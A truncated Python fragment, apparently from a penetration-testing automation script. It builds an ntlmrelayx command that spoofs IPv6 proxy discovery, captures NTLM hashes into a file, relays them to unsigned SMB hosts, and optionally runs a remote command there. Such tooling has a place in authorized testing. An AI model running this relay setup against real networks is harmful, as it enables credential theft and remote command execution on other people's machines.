#!/usr/bin/env python3

def ntlmrelay_setup(args):
    cwd = os.getcwd()
    if args.command:
        remote_cmd = args.command
        relay_cmd = ('python2 {}/submodules/ntlmrelayx.py -6 -wh Proxy-Service'
                     ' -of hashes/ntlmrelay-hashes -tf smb-unsigned-hosts.txt -wa 1 -c "{}"'.format(cwd, remote_cmd))
    else:
        relay_cmd = ('python2 {}/submodules/ntlmrelayx.py -6 -wh Proxy-Service'
                     ' -of hashes/ntlmrelay-hashes -tf smb-unsigned-hosts.txt -wa 1'.format(cwd))

        #